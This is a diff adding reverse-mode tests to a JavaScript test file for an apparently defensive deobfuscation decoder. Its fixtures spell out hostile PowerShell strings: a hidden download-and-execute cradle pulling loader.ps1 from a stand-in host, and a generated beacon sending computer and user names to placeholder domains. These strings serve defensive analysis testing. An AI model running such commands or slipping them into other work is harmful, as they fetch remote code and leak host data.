@@ -2,7 +2,7 @@
 const test = require('node:test');
 const assert = require('node:assert/strict');
 const zlib = require('node:zlib');
-const { decode } = require('../js/decoder.js');
+const { decode, reverseString } = require('../js/decoder.js');
 
 const utf16b64 = (s) => Buffer.from(s, 'utf16le').toString('base64');
 const utf8b64 = (s) => Buffer.from(s, 'utf8').toString('base64');
@@ -340,3 +340,80 @@ test('Multi-layer chain: SafeLinks + Hex IP + @ phish, and Hex -> Base64 -> Defa
   assert.equal(rTriple.ok, true);
   assert.equal(rTriple.output, 'https://drop.evil.test/stager.bin');
 });
+
+/* ------------------------------------------------------------------ */
+/* Reverse Mode & Multi-Layer Reversed Command Tests                  */
+/* ------------------------------------------------------------------ */
+
+test('Reverse: explicit Reverse mode flips reversed command back to original', async () => {
+  const reversedCmd = reverseString(CMD);
+  const r = await decode(reversedCmd, 'reverse');
+  assert.equal(r.ok, true);
+  assert.equal(r.mode, 'reverse');
+  assert.equal(r.output, CMD);
+  assert.ok(r.steps.some((s) => /Reversed string/.test(s)));
+});
+
+test('Reverse: Auto-Detect recognizes standalone reversed PowerShell / CMD / URL commands', async () => {
+  const reversedCmd = reverseString(CMD);
+  const r = await decode(reversedCmd);
+  assert.equal(r.ok, true);
+  assert.equal(r.mode, 'reverse');
+  assert.equal(r.output, CMD);
+
+  const psEnc = 'powershell.exe -NoP -W Hidden -enc ' + utf16b64('whoami /all');
+  const rPs = await decode(reverseString(psEnc));
+  assert.equal(rPs.ok, true);
+  assert.equal(rPs.output, 'whoami /all');
+});
+
+test('Reverse: PDF investigation scenario (Base64 -> Base64 -> Reversed command)', async () => {
+  const pdfCommand = 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\'https://cdn.mal-pdf-update.test/loader.ps1\')"';
+  const reversed = reverseString(pdfCommand);
+  const layer1 = utf8b64(reversed);
+  const layer2 = utf8b64(layer1);
+
+  // Auto-Detect peels Base64 -> Base64 -> Reverse automatically
+  const rAuto = await decode(layer2);
+  assert.equal(rAuto.ok, true);
+  assert.equal(rAuto.output, pdfCommand);
+  assert.ok(rAuto.steps.some((s) => /Reversed string/.test(s)));
+
+  // Explicit Reverse mode on the reversed layer also works directly
+  const rManual = await decode(reversed, 'reverse');
+  assert.equal(rManual.ok, true);
+  assert.equal(rManual.output, pdfCommand);
+});
+
+test('Reverse: Reversed outer Base64 -> inner Base64 -> command (Reverse -> Base64 -> Base64)', async () => {
+  const cmd = 'powershell.exe -NoP -W Hidden -Command "Start-Process calc.exe"';
+  const b64Twice = utf8b64(utf8b64(cmd));
+  const reversedOuter = reverseString(b64Twice);
+
+  const r = await decode(reversedOuter);
+  assert.equal(r.ok, true);
+  assert.equal(r.output, cmd);
+});
+
+test('Reverse: massive multi-kilobyte enterprise/threat-actor command (explicit & multi-layer)', async () => {
+  const blocks = [];
+  for (let i = 1; i <= 60; i++) {
+    blocks.push(
+      `$stage${i} = [System.Net.DNS]::GetHostAddresses("beacon-${i}.corp-telemetry-sync.test"); ` +
+      `if ($stage${i}) { Invoke-WebRequest -Uri "https://node-${i}.corp-telemetry-sync.test/api/v2/collect?host=$env:COMPUTERNAME&user=$env:USERNAME&iter=${i}" -UseBasicParsing -TimeoutSec 5 | Out-Null }`
+    );
+  }
+  const massiveCmd = `powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "${blocks.join('; ')}"`;
+  assert.ok(massiveCmd.length > 12000);
+
+  const massiveReversed = reverseString(massiveCmd);
+  const rDirect = await decode(massiveReversed, 'reverse');
+  assert.equal(rDirect.ok, true);
+  assert.equal(rDirect.output, massiveCmd);
+
+  const doubleB64Massive = utf8b64(utf8b64(massiveReversed));
+  const rLayered = await decode(doubleB64Massive);
+  assert.equal(rLayered.ok, true);
+  assert.equal(rLayered.output, massiveCmd);
+});
+
